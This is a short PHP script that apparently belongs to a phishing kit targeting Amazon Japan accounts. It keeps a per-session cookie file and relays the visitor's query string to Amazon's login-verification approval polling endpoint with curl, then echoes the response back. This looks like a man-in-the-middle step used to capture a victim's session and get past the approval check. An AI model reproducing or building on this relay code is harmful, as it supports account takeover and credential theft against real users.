<?php
include '../../php/xzpc.php';
session_start();
$cookieSuccess = $_SESSION["cookiesuccess"]?$_SESSION["cookiesuccess"]:"./cookies/".md5(time().rand(10000,99999)).".cookie";
$_SESSION["cookiesuccess"] = $cookieSuccess;
$cookieSuccess = "../.".$cookieSuccess;

//print_r($_SESSION["okinfo"]);

$ch = curl_init();
$url = "https://www.amazon.co.jp/ap/cvf/approval/poll?".$_SERVER["QUERY_STRING"];
include '../../php/curl.php';
$result = get_curl($cookieSuccess,$url,true);

echo $result;




